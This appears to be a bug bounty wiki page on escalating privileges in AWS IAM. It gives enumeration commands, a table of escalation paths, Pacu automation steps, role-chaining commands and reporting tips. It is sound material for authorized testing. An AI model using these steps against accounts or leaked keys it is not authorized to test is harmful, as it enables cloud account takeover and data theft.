> Source: https://bugbounty.info/Attack-Surface/Cloud/AWS/IAM-Privilege-Escalation

# AWS IAM Privilege Escalation

IAM privesc is where cloud bugs go from interesting to critical. You start with a low-privilege key - maybe leaked in a JS file or grabbed via SSRF - and work up to admin. The key insight: IAM is complex enough that over-permissive policies are the norm, not the exception. Rhino Security has the canonical list of privesc paths; Pacu automates most of them.

## Step 1: Enumerate What You Have

Never assume you know what a key can do from its name or the role it's attached to.

```bash
# Install enumerate-iam
pip install enumerate-iam
 
# Run it against your creds (this makes a lot of API calls - noisy)
python enumerate-iam.py --access-key AKIA... --secret-key ... --session-token ...
 
# Quieter manual approach: check specific high-value permissions
aws iam get-user
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-user-policy --user-name USERNAME --policy-name POLICYNAME
 
# For roles
aws iam get-role --role-name ROLENAME
aws iam list-attached-role-policies --role-name ROLENAME
aws sts get-caller-identity
```

## Step 2: Known Escalation Paths

These are the most common paths I hit. Full list at [Rhino Security's research](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/).

| Permission | Escalation Method |
| --- | --- |
| `iam:CreatePolicyVersion` | Create new policy version with `*:*` and set as default |
| `iam:SetDefaultPolicyVersion` | Revert to an older, more permissive version |
| `iam:PassRole` + `ec2:RunInstances` | Launch instance with admin role, exfil creds from metadata |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create Lambda with admin role, invoke to run code |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Classic Rhino path, less common now |
| `iam:CreateAccessKey` | Create new key for another user |
| `iam:CreateLoginProfile` | Add console password to IAM user that doesn't have one |
| `iam:UpdateLoginProfile` | Change another user's console password |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to yourself |
| `iam:PutUserPolicy` | Inline policy with full permissions |
| `sts:AssumeRole` | Assume a more privileged role if trust policy allows |

## Step 3: Pacu for Automation

Pacu is the go-to. Use `iam__privesc_scan` to automatically identify and optionally exploit escalation paths.

```bash
# Install
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
 
# Start Pacu
python3 pacu.py
 
# Inside Pacu
set_keys  # enter your creds
whoami    # confirm identity
run iam__enum_permissions  # enumerate what you can do
run iam__privesc_scan       # identify privesc paths
```

Pacu will list available paths and ask if you want to attempt them. In a bug bounty context, I usually stop at identification and document the path rather than fully exploiting to admin unless the program explicitly allows it.

## Role Chaining

Role chaining is underrated. If role A can assume role B, and role B can assume role C, you may end up with permissions that no single role was supposed to have, especially if session tag constraints aren't enforced.

```bash
# Assume a role
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME \
  --role-session-name pentest
 
# Use the returned credentials to assume the next role
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/NEXT_ROLE ...
```

Look for trust policies with `"Principal": {"AWS": "*"}` or overly broad conditions.

## Cross-Account Escalation

If the role's trust policy allows principals from other accounts:

```bash
aws iam get-role --role-name ROLENAME | jq '.Role.AssumeRolePolicyDocument'
```

Check if the principal is `*` or references accounts you control. Some programs have dev accounts that can assume prod roles.

## Reporting Privesc

For bug bounty reports, I always:

1. Document the starting permissions precisely (paste the policy)
2. Show the exact escalation path step by step
3. Demonstrate impact with `aws sts get-caller-identity` showing the elevated identity
4. Stop before doing anything destructive or accessing prod data beyond what proves the bug

## Related

- [AWS Overview](../../../Attack-Surface/Cloud/AWS/)
- [S3 Misconfiguration](../../../Attack-Surface/Cloud/AWS/S3-Misconfiguration) - often where initial creds come from
- [Lambda](../../../Attack-Surface/Cloud/AWS/Lambda) - `iam:PassRole` + Lambda is a top escalation path
